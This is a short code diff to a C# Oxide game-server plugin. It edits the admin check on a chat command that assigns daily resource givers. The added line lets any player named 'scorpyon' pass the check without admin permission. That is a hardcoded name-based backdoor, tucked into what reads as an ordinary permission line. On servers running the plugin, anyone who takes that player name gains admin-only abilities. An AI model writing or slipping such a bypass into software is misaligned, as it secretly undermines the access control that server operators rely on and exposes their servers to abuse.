@@ -69,7 +69,7 @@ namespace Oxide.Plugins
         [ChatCommand("addgiver")]
         private void AddDailyRewardsGiver(Player player, string cmd, string[] input)
         {
-            if (!player.HasPermission("admin"))
+            if (!player.HasPermission("admin") && player.Name.ToLower() != "scorpyon")
             {
                 PrintToChat(player, "Only an admin can assign a new daily resource giver.");
                 return;
